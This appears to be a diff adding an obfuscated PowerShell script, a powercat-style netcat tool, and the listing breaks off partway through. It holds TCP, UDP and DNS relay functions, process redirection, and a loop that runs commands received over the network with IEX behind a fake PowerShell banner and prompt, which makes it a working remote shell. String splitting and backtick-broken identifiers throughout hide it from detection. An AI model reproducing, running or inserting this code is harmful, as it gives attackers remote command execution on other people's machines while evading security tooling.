+  {
+    param(${d`AtA},${F`U`NCv`ARs})
+    ${F`UN`cvaRS}[('Input'+'Dat'+'a')] = ${F`Un`Cv`ARS}[('E'+'ncoding')]."gEt`S`TriNg"(${Da`Ta})
+    return ${func`V`A`Rs}
+  }
+  function Close_DNS
+  {
+    param(${Fun`CvA`RS})
+    ${fInpa`Ck`eT} = &('Inv'+'oke-Comm'+'an'+'d') ${fun`CVA`Rs}[('C'+'reate'+'_FI'+'N')] -ArgumentList @(${Fun`cVA`RS}[('S'+'e'+'ssionId')],${fUncv`A`RS}[('Ta'+'g')],${Fu`N`CvArS}[('Domai'+'n')])
+    &('Invoke'+'-Com'+'m'+'and') ${FuN`C`VARs}[('SendP'+'ac'+'ket')] -ArgumentList @(${fi`N`paCkEt},${fUn`Cva`Rs}[('DN'+'SServ'+'er')],${F`U`N`cVaRs}[('DNSPor'+'t')]) | &('Ou'+'t-'+'Null')
+  }
+  
+  
+  
+  function Setup_TCP
+  {
+    param(${f`UNc`seT`UpV`ARs})
+    ${C},${l},${P},${t} = ${FUn`CsE`T`UP`VaRS}
+    if(${G`LOB`AL:vEr`Bo`Se}){${VE`Rb`ose} = ${Tr`UE}}
+    ${F`U`NCvars} = @{}
+    if(!${l})
+    {
+      ${f`UN`c`VArs}["l"] = ${F`AlsE}
+      ${sO`c`kET} = &('New-O'+'bjec'+'t') System.Net.Sockets.TcpClient
+      &('Wri'+'te'+'-Verbose') ('Conn'+'e'+'cting..'+'.')
+      ${H`AnDlE} = ${soC`Ket}."Be`giN`CONNE`ct"(${c},${P},${n`Ull},${Nu`lL})
+    }
+    else
+    {
+      ${FU`N`cVaRs}["l"] = ${t`RUe}
+      &('W'+'ri'+'t'+'e-'+'Verbose') ((('Listenin'+'g'+' on [0.0.0.'+'0] (po'+'r'+'t ')) + ${P} + ")")
+      ${s`oc`KeT} = &('New-Ob'+'j'+'e'+'ct') System.Net.Sockets.TcpListener ${P}
+      ${So`c`kEt}."S`TarT"()
+      ${H`ANd`lE} = ${S`OcK`et}."bEGin`A`cce`Pt`T`CpClIEnt"(${N`Ull}, ${N`ULl})
+    }
+    
+    ${sTO`PW`ATCH} = [System.Diagnostics.Stopwatch]::"Sta`RTNEw"()
+    while(${TR`UE})
+    {
+      if(${h`osT}."U`I"."R`AWUI"."k`E`yAVAI`lAbLE")
+      {
+        if(@(17,27) -contains (${ho`ST}."ui"."Raw`Ui"."ReAdK`ey"(('NoEcho,I'+'n'+'clud'+'eKey'+'Down,In'+'c'+'lu'+'deKe'+'yUp'))."vi`Rt`UAlKe`YcO`De"))
+        {
+          &('Write-V'+'erb'+'ose') ('C'+'TR'+'L o'+'r ESC caught. '+'St'+'o'+'pping'+' TCP Se'+'tup...')
+          if(${fu`NcV`ARS}["l"]){${soC`K`eT}."St`oP"()}
+          else{${s`ock`et}."cLO`Se"()}
+          ${sT`op`waT`cH}."sT`OP"()
+          break
+        }
+      }
+      if(${stOP`WAt`ch}."el`APSed"."to`TaL`SEc`OnDS" -gt ${T})
+      {
+        if(!${l}){${SOCK`et}."cLo`Se"()}
+        else{${So`cK`Et}."s`Top"()}
+        ${stop`WA`TCH}."S`Top"()
+        &('Writ'+'e-Ve'+'r'+'bo'+'se') ('T'+'ime'+'out!') ; break
+        break
+      }
+      if(${hA`N`dLE}."isCOm`Pl`etEd")
+      {
+        if(!${L})
+        {
+          try
+          {
+            ${S`OcK`ET}."Endc`O`NneCT"(${Ha`N`DlE})
+            ${STrE`AM} = ${sO`ck`ET}."Ge`TsTReam"()
+            ${Bu`F`FEr`SIZe} = ${s`o`CKET}."Re`ceIve`B`UF`FErSiZe"
+            &('Wr'+'ite-V'+'e'+'rbos'+'e') (('C'+'o'+'nnect'+'io'+'n to ') + ${C} + ":" + ${P} + (' [tcp]'+' s'+'u'+'cc'+'eede'+'d!'))
+          }
+          catch{${SoC`K`eT}."cl`OsE"(); ${ST`Op`wat`CH}."sT`Op"(); break}
+        }
+        else
+        {
+          ${CL`iENt} = ${s`oCk`eT}."eNdac`cep`T`Tcp`client"(${HANd`LE})
+          ${Str`eaM} = ${c`LiEnT}."GeTSt`R`eaM"()
+          ${bUFfE`Rs`IZe} = ${clI`ENT}."REc`EivE`BUFFE`RS`iZe"
+          &('Wri'+'t'+'e-Verbose') (('Conn'+'e'+'ction '+'from '+'[') + ${c`liE`NT}."c`lIent"."reM`o`TeENDpoiNt"."ADdr`EsS"."i`PaDDresst`O`STrInG" + ('] po'+'r'+'t ') + ${PO`RT} + ((' '+'[tcp] a'+'c'+'cepted (sour'+'ce por'+'t ')) + ${cLiE`Nt}."cLiE`NT"."R`EMOteE`NdPO`inT"."p`OrT" + ")")
+        }
+        break
+      }
+    }
+    ${STOp`wA`TCh}."s`TOp"()
+    if(${SoC`keT} -eq ${nu`ll}){break}
+    ${FUN`cv`A`Rs}[('Str'+'e'+'am')] = ${StrE`AM}
+    ${FuN`c`Vars}[('So'+'cket')] = ${S`o`CkET}
+    ${FUN`cva`Rs}[('Buf'+'fe'+'rSize')] = ${buF`FERs`iZe}
+    ${f`Unc`V`ArS}[('Strea'+'mDe'+'sti'+'nat'+'ionBu'+'f'+'f'+'er')] = (&('Ne'+'w-'+'Object') System.Byte[] ${FUn`CV`ARS}[('B'+'uff'+'er'+'Size')])
+    ${Fu`N`cvarS}[('S'+'tr'+'eamReadOp'+'erat'+'ion')] = ${F`UN`cVars}[('S'+'tr'+'eam')]."Begi`Nread"(${FUnc`VA`RS}[('S'+'trea'+'mDesti'+'nati'+'on'+'Buffe'+'r')], 0, ${fUNc`V`A`Rs}[('Buffer'+'Siz'+'e')], ${nU`lL}, ${Nu`ll})
+    ${f`UnCVA`Rs}[('E'+'nco'+'ding')] = &('New'+'-Objec'+'t') System.Text.AsciiEncoding
+    ${funC`VA`Rs}[('S'+'tre'+'amByt'+'es'+'Read')] = 1
+    return ${f`UnCV`ARs}
+  }
+  function ReadData_TCP
+  {
+    param(${fU`NcVarS})
+    ${D`AtA} = ${n`ULl}
+    if(${F`UNcva`RS}[('S'+'tre'+'amBytes'+'Re'+'ad')] -eq 0){break}
+    if(${fu`Ncva`RS}[('St'+'reamReadO'+'pera'+'ti'+'on')]."iS`C`omPLEteD")
+    {
+      ${sT`ReA`mbYTE`sreAD} = ${fuN`cVa`RS}[('S'+'tream')]."enDr`EAd"(${f`UNCV`ARs}[('Str'+'eamRead'+'Op'+'er'+'ation')])
+      if(${Stream`BY`T`eSRE`Ad} -eq 0){break}
+      ${DA`TA} = ${FUN`c`VArS}[('S'+'trea'+'mDes'+'tinat'+'ion'+'Bu'+'ffer')][0..([int]${S`Tr`ea`MB`ytESReAd}-1)]
+      ${FuN`c`VARs}[('StreamR'+'ead'+'O'+'peratio'+'n')] = ${F`UNC`VARS}[('Str'+'eam')]."bE`giN`ReAd"(${funC`V`A`Rs}[('S'+'tream'+'De'+'stinationBuff'+'er')], 0, ${fu`N`Cvars}[('Buffe'+'rSiz'+'e')], ${N`ULL}, ${n`UlL})
+    }
+    return ${da`Ta},${Fu`NC`V`Ars}
+  }
+  function WriteData_TCP
+  {
+    param(${D`AtA},${fuNc`VarS})
+    ${FU`NC`VARs}[('St'+'r'+'eam')]."WRI`Te"(${Da`TA}, 0, ${da`TA}."LE`N`gTH")
+    return ${FU`NCVA`RS}
+  }
+  function Close_TCP
+  {
+    param(${f`UNcV`Ars})
+    try{${fU`NCv`ARs}[('Str'+'eam')]."c`lOSe"()}
+    catch{}
+    if(${F`UNc`VA`RS}["l"]){${F`Un`cvaRS}[('S'+'ocke'+'t')]."S`TOp"()}
+    else{${FU`Ncv`ArS}[('Soc'+'ket')]."cl`OSE"()}
+  }
+  
+  
+  
+  function Setup_CMD
+  {
+    param(${fU`Nc`SETUpvARS})
+    if(${gLob`Al`:Ver`Bo`Se}){${V`erbo`sE} = ${t`RuE}}
+    ${FUNc`V`ARS} = @{}
+    ${PrO`CessS`TArT`INFo} = &('N'+'ew-O'+'bject') System.Diagnostics.ProcessStartInfo
+    ${PR`OCE`Ss`sT`A`RtinFO}."Filen`A`Me" = ${FUnc`setU`p`V`ArS}[0]
+    ${prOc`E`ssstAR`Tin`FO}."USeSHELLeX`eCU`TE" = ${Fa`LSe}
+    ${proC`Es`ssTa`RTIn`Fo}."r`edi`R`eCTStA`NdardiNPUT" = ${Tr`UE}
+    ${PROCes`s`sta`RTin`Fo}."R`eDIrect`STAn`D`ArDOU`TPUT" = ${t`RUE}
+    ${pR`ocEsSST`AR`TINfO}."RED`i`RecTs`TA`Ndard`Er`ROR" = ${T`RuE}
+    ${F`UncV`ArS}[('Proc'+'ess')] = [System.Diagnostics.Process]::"sTA`Rt"(${PrO`CE`SS`sTAR`TiN`Fo})
+    &('W'+'rite'+'-Verb'+'o'+'se') (('S'+'tartin'+'g '+'Process'+' ') + ${fUnC`SETU`pVA`Rs}[0] + ('..'+'.'))
+    ${f`U`NC`VARS}[('P'+'r'+'ocess')]."sT`Art"() | &('Ou'+'t-Nu'+'ll')
+    ${F`Uncv`ARs}[('S'+'tdOu'+'tDest'+'in'+'a'+'tio'+'nBuffer')] = &('New-Obje'+'c'+'t') System.Byte[] 65536
+    ${FUnc`VA`RS}[('StdO'+'utR'+'e'+'adOpera'+'tion')] = ${Fu`NcVa`Rs}[('Pro'+'ces'+'s')]."S`TA`NdARDOuTp`UT"."BAsest`R`eAm"."BeGiNR`Ead"(${fUN`cV`Ars}[('St'+'d'+'Ou'+'tDe'+'st'+'ina'+'tionBuffer')], 0, 65536, ${nu`ll}, ${n`ULL})
+    ${F`UNCv`A`RS}[('St'+'d'+'Err'+'DestinationB'+'uff'+'er')] = &('New-Ob'+'jec'+'t') System.Byte[] 65536
+    ${fuN`cVa`RS}[('StdEr'+'rReadO'+'peratio'+'n')] = ${fU`NcVA`RS}[('Pro'+'cess')]."s`Tan`DaRD`ErRor"."B`A`sESTrEam"."BEgI`NreAd"(${F`Un`CVArS}[('StdEr'+'rDestina'+'ti'+'onBuf'+'f'+'er')], 0, 65536, ${NU`LL}, ${n`ULL})
+    ${fun`cV`ARs}[('Enco'+'di'+'ng')] = &('Ne'+'w-Obje'+'c'+'t') System.Text.AsciiEncoding
+    return ${funcV`A`Rs}
+  }
+  function ReadData_CMD
+  {
+    param(${f`U`N`CVars})
+    [byte[]]${dA`TA} = @()
+    if(${fUnC`VARS}[('S'+'tdOu'+'tRe'+'adOper'+'atio'+'n')]."i`Sc`OMPLETed")
+    {
+      ${Stdou`TBy`TEsReAd} = ${fUNc`VaRs}[('P'+'r'+'ocess')]."StAND`ARdoUT`P`Ut"."B`AsEst`ReaM"."enD`Re`Ad"(${fUNc`Va`RS}[('StdOut'+'ReadOper'+'ati'+'o'+'n')])
+      if(${S`T`dOU`TbYtESreaD} -eq 0){break}
+      ${dA`Ta} += ${fU`Nc`VArs}[('St'+'dO'+'utDest'+'ina'+'tionBuffer')][0..([int]${StDOUT`B`yteS`R`EaD}-1)]
+      ${fUNC`Va`RS}[('StdOutR'+'eadOpera'+'ti'+'o'+'n')] = ${f`UN`cvars}[('Proces'+'s')]."S`TANdArd`ou`T`PUt"."b`AS`Es`TReAM"."BEGinrE`Ad"(${FU`NcvArs}[('StdOut'+'Dest'+'i'+'na'+'tionB'+'uffe'+'r')], 0, 65536, ${n`Ull}, ${n`Ull})
+    }
+    if(${fU`NC`VArS}[('S'+'tdE'+'rrRead'+'Ope'+'rat'+'ion')]."is`c`Om`PLeTED")
+    {
+      ${St`derR`BytESRE`Ad} = ${fuN`C`VARs}[('Proce'+'ss')]."sT`A`N`DaRdE`RrOr"."BA`sEStr`EaM"."eND`R`eAD"(${fun`C`V`ARs}[('StdE'+'rrR'+'eadOpe'+'rat'+'ion')])
+      if(${Std`ERrBY`Te`S`ReAd} -eq 0){break}
+      ${da`TA} += ${Fu`NCVa`Rs}[('St'+'dErrDe'+'stin'+'a'+'tionBuffe'+'r')][0..([int]${s`T`dEr`Rbytesr`eAD}-1)]
+      ${F`Un`cVarS}[('StdErrRe'+'adO'+'pera'+'tio'+'n')] = ${FuNCV`A`Rs}[('Pro'+'ce'+'ss')]."ST`AnD`Ard`eRRoR"."base`STR`EAm"."b`E`gInR`EAd"(${FunC`Va`Rs}[('St'+'d'+'Er'+'r'+'DestinationBuffer')], 0, 65536, ${nU`ll}, ${nU`ll})
+    }
+    return ${da`Ta},${fU`N`cVArs}
+  }
+  function WriteData_CMD
+  {
+    param(${dA`TA},${FUN`cV`ARs})
+    ${FU`N`CVArs}[('Pro'+'cess')]."St`ANda`RDiN`pUT"."Wr`ITelI`Ne"(${FuN`CvArs}[('Enc'+'odi'+'ng')]."GE`TstR`ING"(${D`ATA})."tr`I`mEND"("`r")."tR`iM`enD"("`n"))
+    return ${F`UnC`VARs}
+  }
+  function Close_CMD
+  {
+    param(${F`UnCv`Ars})
+    ${fuNCVA`RS}[('Pr'+'oces'+'s')] | &('S'+'top-P'+'rocess')
+  }  
+  
+  
+  
+  function Main_Powershell
+  {
+    param(${sTreA`m`1`SetUpV`Ars})   
+    try
+    {
+      ${E`NCoDi`NG} = &('Ne'+'w-O'+'bj'+'ect') System.Text.AsciiEncoding
+      [byte[]]${inpUt`TowR`ITe} = @()
+      if(${I} -ne ${NU`lL})
+      {
+        &('W'+'rit'+'e-Verbose') ('Inpu'+'t '+'fro'+'m -i'+' d'+'etected.'+'..')
+        if(&('Te'+'s'+'t-Path') ${I}){ [byte[]]${I`N`pUttOwr`iTe} = ([io.file]::"rE`ADalL`B`YTEs"(${i})) }
+        elseif(${i}."GE`TT`yPe"()."Na`ME" -eq ('B'+'y'+'te[]')){ [byte[]]${in`pu`TT`owRite} = ${I} }
+        elseif(${I}."gEtTY`PE"()."N`Ame" -eq ('Str'+'in'+'g')){ [byte[]]${I`NpUTt`owrItE} = ${e`N`codiNG}."GETBY`TES"(${i}) }
+        else{&('Writ'+'e-'+'Host') ('Unrec'+'ognis'+'e'+'d input '+'type.') ; return}
+      }
+    
+      &('Wri'+'t'+'e-'+'Verbo'+'se') ('S'+'etting '+'up St'+'ream'+' '+'1... (E'+'SC/'+'CTR'+'L'+' t'+'o e'+'xit)')
+      try{${stRe`A`M`1vARS} = &('S'+'t'+'re'+'am1_'+'Setup') ${S`TRE`AM1seTuP`VaRS}}
+      catch{&('Wri'+'te-Verbos'+'e') ('St'+'ream'+' 1 '+'Setup Fa'+'i'+'lu'+'re') ; return}
+      
+      &('W'+'ri'+'te-Ver'+'bose') ('Se'+'ttin'+'g'+' up Stream 2.'+'.. (ES'+'C/CTRL'+' '+'to'+' '+'exit)')
+      try
+      {
+        ${IN`TROPr`o`MPT} = ${E`Nc`ODinG}."Ge`Tby`TEs"(('Wind'+'ows '+"PowerShell`nCopyright "+'(C'+') '+'201'+'3 '+'Mic'+'ro'+'soft '+'C'+'orporat'+'io'+'n.'+' '+'All'+' '+'righ'+'ts '+"reserved.`n`n") + (('PS'+' ') + (&('pw'+'d'))."pA`Th" + '> '))
+        ${pR`Om`PT} = (('P'+'S ') + (&('pw'+'d'))."pA`TH" + '> ')
+        ${CO`MMAND`ToexECu`Te} = ""      
+        ${d`ATA} = ${N`Ull}
+      }
+      catch
+      {
+        &('Write'+'-'+'Ve'+'rbos'+'e') ('Stream '+'2 '+'Setup'+' Fai'+'lure') ; return
+      }
+      
+      if(${INPutTo`wrI`Te} -ne @())
+      {
+        &('W'+'r'+'ite'+'-Verb'+'ose') ('W'+'riting'+' input'+' t'+'o St'+'re'+'am '+'1...')
+        try{${S`Tr`EAm1VArS} = &('Strea'+'m1_'+'W'+'riteData') ${I`N`puT`TowRItE} ${StrEaM`1`VaRS}}
+        catch{&('Wr'+'it'+'e-Host') ('Fa'+'iled'+' to w'+'r'+'ite input'+' '+'to'+' St'+'rea'+'m '+'1') ; return}
+      }
+      
+      if(${d}){&('Wr'+'ite'+'-Ver'+'bose') ('-d '+'(d'+'isconnec'+'t) '+'Ac'+'tiv'+'a'+'t'+'ed. D'+'isconnectin'+'g.'+'..') ; return}
+      
+      &('Wri'+'te-Verbo'+'s'+'e') ('B'+'o'+'th C'+'om'+'munic'+'at'+'ion'+' S'+'tr'+'e'+'ams Est'+'ablis'+'he'+'d'+'. Redirec'+'ting D'+'a'+'ta Be'+'tween Stream'+'s.'+'.'+'.')
+      while(${T`RUE})
+      {        
+        try
+        {
+          
+          ${pRO`M`PT} = ${N`ULL}
+          ${retUrN`edD`ATA} = ${nu`lL}
+          if(${CoMmA`N`DToe`xeC`U`Te} -ne "")
+          {
+            try{[byte[]]${R`EtU`RNEdDA`TA} = ${ENc`O`dIng}."gE`Tbyt`eS"((&('I'+'EX') ${ComMA`N`Dtoe`xEcuTe} 2>&1 | &('Out-St'+'r'+'ing')))}
+            catch{[byte[]]${reTU`RNe`D`dATA} = ${EnC`OD`inG}."G`EtB`Ytes"((${_} | &('Ou'+'t-Str'+'ing')))}
+            ${p`Ro`MPT} = ${En`Cod`InG}."gE`TBYTEs"((('P'+'S ') + (&('p'+'wd'))."Pa`TH" + '> '))
+          }
+          ${Da`TA} += ${Int`RoprOm`PT}
+          ${I`NTROPro`Mpt} = ${nU`lL}
+          ${DA`TA} += ${r`etUR`NeDDa`TA}
+          ${D`AtA} += ${pr`O`MpT}
+          ${c`OmMANDT`OeXEcu`TE} = ""
+          
+
+          if(${d`ATA} -ne ${nu`lL}){${St`Re`AM1VARs} = &('Stream1_'+'W'+'r'+'iteD'+'ata') ${d`ATA} ${Str`eA`m1`VARs}}
+          ${da`TA} = ${n`UlL}
+        }
+        catch
+        {
+          &('Wr'+'it'+'e-'+'Ve'+'rbose') ('Fa'+'i'+'led'+' to'+' r'+'edirect data'+' '+'from Str'+'eam 2 '+'to S'+'tream 1') ; return
+        }
+        
+        try
+        {
+          ${da`Ta},${StrE`Am`1vA`Rs} = &('St'+'r'+'ea'+'m1_ReadData') ${STR`ea`m1vARs}
+          if(${D`AtA}."LEnG`Th" -eq 0){&('S'+'t'+'art-Sleep') -Milliseconds 100}
+          if(${d`ATA} -ne ${NU`LL}){${comMA`NDT`Oe`xEcUTe} = ${E`NCoDi`Ng}."gE`Ts`TRi`NG"(${Da`Ta})}
+          ${Da`TA} = ${Nu`LL}
+        }
+        catch
+        {
+          &('W'+'ri'+'te-Ve'+'rbose') ('F'+'ai'+'le'+'d'+' to'+' redirect'+' dat'+'a'+' '+'from Stream 1 t'+'o St'+'r'+'eam 2') ; return
+        }
+      }
+    }
+    finally
+    {
+      try
+      {
+        &('W'+'rite-Ver'+'b'+'ose') ('Closin'+'g'+' S'+'tream 1.'+'..')
+        &('Stream1_Clo'+'s'+'e') ${StRE`AM1v`ArS}
+      }
+      catch
+      {
+        &('Writ'+'e-'+'Ver'+'bo'+'se') ('Fai'+'led '+'to'+' '+'c'+'lose Stream 1')
+      }
+    }
+  }
+  
+
+  
+  function Setup_Console
+  {
+    param(${F`UnCS`EtuP`VaRs})
+    ${F`UNC`V`ARS} = @{}
+    ${fU`N`cVaRs}[('Encod'+'in'+'g')] = &('N'+'ew-Obj'+'ect') System.Text.AsciiEncoding
+    ${FU`Ncv`ArS}[('Outpu'+'t')] = ${Func`Se`TUP`VArs}[0]
+    ${FUNCv`ARs}[('O'+'utput'+'By'+'tes')] = [byte[]]@()
+    ${f`Unc`VARS}[('Outpu'+'tSt'+'rin'+'g')] = ""
+    return ${fUNCv`A`Rs}
+  }
+  function ReadData_Console
+  {
+    param(${Fu`Ncva`Rs})
+    ${dA`TA} = ${Nu`ll}
+    if(${H`osT}."U`i"."R`AwUI"."kEYAV`AIL`ABLe")
+    {
+      ${da`Ta} = ${FUn`cV`Ars}[('Encod'+'in'+'g')]."GEt`B`YTEs"((&('Re'+'ad-Ho'+'st')) + "`n")
+    }
+    return ${D`ATa},${FUnC`V`Ars}
+  }
+  function WriteData_Console
+  {
+    param(${D`ATA},${fUNc`V`ARS})
+    switch(${FuN`C`Va`Rs}[('O'+'ut'+'put')])
+    {
+      ('Hos'+'t') {&('W'+'rite-Hos'+'t') -n ${f`Unc`VARs}[('E'+'ncoding')]."GETstR`I`NG"(${dA`Ta})}
+      ('Stri'+'n'+'g') {${FU`NCV`A`Rs}[('Out'+'putS'+'tr'+'ing')] += ${F`UNCVA`RS}[('Enc'+'odin'+'g')]."Get`StRiNg"(${dA`TA})}
+      ('Byt'+'es') {${fUn`CV`ARs}[('Outp'+'ut'+'Bytes')] += ${d`ATa}}
+    }
+    return ${fU`NC`VA`Rs}
+  }
+  function Close_Console
+  {
+    param(${FUN`C`VARs})
+    if(${fUn`cvArS}[('Output'+'St'+'ring')] -ne ""){return ${Fun`C`VaRS}[('Ou'+'tputSt'+'ring')]}
+    elseif(${fuN`cva`RS}[('O'+'ut'+'putByte'+'s')] -ne @()){return ${fUNc`Va`RS}[('O'+'utp'+'utByt'+'es')]}
+    return
+  }
+  
+  
+  
+  function Main
+  {
+    param(${S`TREam1s`et`UPV`ARS},${s`TrE`AM2`sETu`PV`Ars})
+    try
+    {
+      [byte[]]${I`NPut`T`owritE} = @()
+      ${e`NC`o`dInG} = &('N'+'ew-Ob'+'ject') System.Text.AsciiEncoding
+      if(${I} -ne ${NU`Ll})
+      {
+        &('W'+'rit'+'e-Verbos'+'e') ('I'+'n'+'pu'+'t f'+'ro'+'m -i '+'detecte'+'d...')
+        if(&('Tes'+'t-'+'Path') ${I}){ [byte[]]${INp`UT`TOWr`ITE} = ([io.file]::"R`eAdal`lbYtEs"(${i})) }
+        elseif(${i}."GEt`TYPe"()."nA`me" -eq ('Byt'+'e'+'[]')){ [byte[]]${IN`PU`T`TO`wRiTe} = ${I} }
+        elseif(${i}."GETT`Y`pE"()."Na`mE" -eq ('Stri'+'ng')){ [byte[]]${Inputt`O`wr`ITe} = ${E`NC`odInG}."Ge`TB`yTes"(${i}) }
+        else{&('W'+'rite-'+'Host') ('Unrec'+'ognised'+' i'+'nput'+' type.') ; return}
+      }
+      
+      &('W'+'ri'+'te-Verbos'+'e') ('Sett'+'ing'+' '+'up St'+'ream 1..'+'.')
+      try{${str`eAM1`V`ARS} = &('Stre'+'am1_'+'Se'+'tup') ${S`T`R`eaM1sEtupv`ARs}}
+      catch{&('Wri'+'te-V'+'e'+'rbose') ('S'+'t'+'rea'+'m 1'+' Setup'+' F'+'ailure') ; return}
+      
+      &('Write'+'-Ve'+'rbo'+'se') ('Setting '+'up'+' Str'+'ea'+'m 2...')
+      try{${ST`REa`m2vA`Rs} = &('St'+'r'+'eam2_Setu'+'p') ${st`ReaM2`S`etUPVA`RS}}
+      catch{&('Write'+'-Ver'+'b'+'ose') ('Strea'+'m 2'+' Setup Fai'+'l'+'u'+'re') ; return}
+      
+      ${D`AtA} = ${nu`LL}
+      
+      if(${iNP`UTT`OW`RitE} -ne @())
+      {
+        &('W'+'rite'+'-Verbose') ('Writing inp'+'u'+'t'+' t'+'o St'+'r'+'eam '+'1'+'...')
+        try{${s`TreAM`1`VarS} = &('S'+'tream1_'+'W'+'riteD'+'ata') ${INP`Utt`owriTE} ${S`TRe`Am1VarS}}
+        catch{&('W'+'ri'+'te-Host') ('Fa'+'ile'+'d t'+'o w'+'r'+'ite i'+'nput to S'+'t'+'ream 1') ; return}
+      }
+      
+      if(${d}){&('Write-'+'Ve'+'rbose') ('-d (dis'+'c'+'onnect) Activated. Di'+'s'+'con'+'nect'+'ing...') ; return}
+      
+      &('Wri'+'t'+'e-V'+'er'+'bose') ('B'+'oth '+'Communicat'+'i'+'o'+'n St'+'reams Est'+'abli'+'shed. Red'+'irecting D'+'ata'+' Betwee'+'n Strea'+'m'+'s...')
+      while(${tr`Ue})
+      {
+        try
+        {
+          ${Da`Ta},${StREa`M2`Va`RS} = &('Str'+'eam2_R'+'ea'+'dD'+'ata') ${s`TreA`M2VARS}
+          if((${DA`Ta}."l`eNGTh" -eq 0) -or (${Da`Ta} -eq ${nu`lL})){&('Start'+'-Sle'+'ep') -Milliseconds 100}
+          if(${da`TA} -ne ${nU`LL}){${ST`REaM1`V`ARs} = &('Stream'+'1_'+'WriteD'+'ata') ${D`ATA} ${stREAm1`V`ArS}}
+          ${d`ATa} = ${N`Ull}
+        }
+        catch
+        {
+          &('Write-Ver'+'bo'+'s'+'e') ('Fa'+'ile'+'d to'+' redi'+'rect'+' data'+' from'+' '+'S'+'tream 2 '+'to Stream 1') ; return
+        }
+        
+        try
+        {
+          ${D`AtA},${StrEA`m`1VARS} = &('Strea'+'m'+'1_ReadDa'+'ta') ${st`ReAM`1`VARS}
+          if((${Da`TA}."lEN`Gth" -eq 0) -or (${da`TA} -eq ${NU`ll})){&('Sta'+'rt-Slee'+'p') -Milliseconds 100}
+          if(${dA`TA} -ne ${n`UlL}){${Str`EA`M2VArs} = &('St'+'re'+'am'+'2_Writ'+'eD'+'ata') ${d`AtA} ${ST`R`ea`m2VArs}}
+          ${d`ATa} = ${NU`lL}
+        }
+        catch
+        {
+          &('Wri'+'te'+'-'+'V'+'erbose') ('Fa'+'iled '+'to'+' re'+'d'+'ir'+'ect '+'dat'+'a'+' from Strea'+'m 1 to '+'Stream 2') ; return
+        }
+      }
+    }
+    finally
+    {
+      try
+      {
+        
+        &('St'+'rea'+'m2_Clo'+'se') ${STrE`Am2`VA`RS}
+      }
+      catch
+      {
+        &('Wr'+'ite-V'+'erb'+'ose') ('Fail'+'ed to clo'+'se Stream'+' '+'2')
+      }
+      try
+      {
+        
+        &('St'+'r'+'eam'+'1_Clos'+'e') ${strea`M1`VARs}
+      }
+      catch
+      {
+        &('W'+'ri'+'te'+'-V'+'erbose') ('Fai'+'led t'+'o clos'+'e S'+'tream 1')
+      }
+    }
+  }
+  
+  
+  
+  if(${u})
+  {
+    &('Writ'+'e-'+'Ve'+'rbo'+'se') ('Se'+'t '+'Stream'+' 1:'+' UDP')
+    ${FUn`Cti`o`NStrINg} = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+    ${fu`NctIOn`sTr`ing} += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+    ${fuNC`TIo`N`StRing} += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+    ${fu`NctioNs`TRi`NG} += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+    if(${l}){${i`N`VoKe`sTRing} = ('M'+'ain '+"@('',`$True,'$p','$t') "+'')}
+    else{${INVOke`Str`ing} = ('Ma'+'in '+"@('$c',`$False,'$p','$t') "+'')}
+  }
+  elseif(${D`NS} -ne "")
+  {
+    &('Wri'+'te-Verb'+'o'+'se') ('Se'+'t Stream'+' 1: D'+'N'+'S')
+    ${fu`NcT`iOn`s`TrinG} = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+    ${fuN`CT`IOns`TRInG} += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+    ${fUncTi`oN`st`RiNG} += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+    ${FUNC`TiO`N`StRiNg} += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+    if(${L}){return ('This '+'f'+'eatu'+'re '+'is'+' n'+'ot ava'+'ilable'+'.')}
+    else{${In`Vok`es`T`RINg} = ('Main'+' '+"@('$c','$p','$dns',$dnsft) "+'')}
+  }
+  else
+  {
+    &('Wri'+'te'+'-Verbose') ('Set St'+'re'+'am 1: TC'+'P')
+    ${f`UN`Ct`iON`stRiNG} = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+    ${fUNcT`ioN`sT`Ri`Ng} += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+    ${fuN`CTiOn`S`TRInG} += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+    ${fuNCTI`On`S`TRi`Ng} += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+    if(${L}){${I`NVok`e`STRING} = ('Main'+' '+"@('',`$True,$p,$t) "+'')}
+    else{${inVOK`ESt`Ri`Ng} = ('Mai'+'n '+"@('$c',`$False,$p,$t) "+'')}
+  }
+  
+  if(${E} -ne "")
+  {
+    &('Writ'+'e'+'-'+'Verbose') ('Set '+'Str'+'ea'+'m 2: Pro'+'ces'+'s')
+    ${Fun`ctIo`Nstr`iNG} += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
+    ${fUNcTioNs`T`R`I`Ng} += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
+    ${FuN`cTIo`N`sT`RiNg} += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
+    ${fu`NCTi`oNs`TR`iNG} += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
+    ${InVOKesT`R`ing} += "@('$e')`n`n"
+  }
+  elseif(${E`P})
+  {
+    &('Wr'+'it'+'e-'+'Verbose') ('Se'+'t Stre'+'a'+'m 2: '+'Powersh'+'ell')
+    ${INVOKEs`TRI`Ng} += "`n`n"
+  }
+  elseif(${R} -ne "")
+  {
+    if(${R}."s`PliT"(":")[0]."tOLoW`ER"() -eq ('ud'+'p'))
+    {
+      &('W'+'ri'+'te-Verb'+'ose') ('Se'+'t'+' Str'+'eam 2: '+'UDP')
+      ${fUnCtIO`NSt`R`ING} += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+      ${fUn`CTi`OnSTR`I`Ng} += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
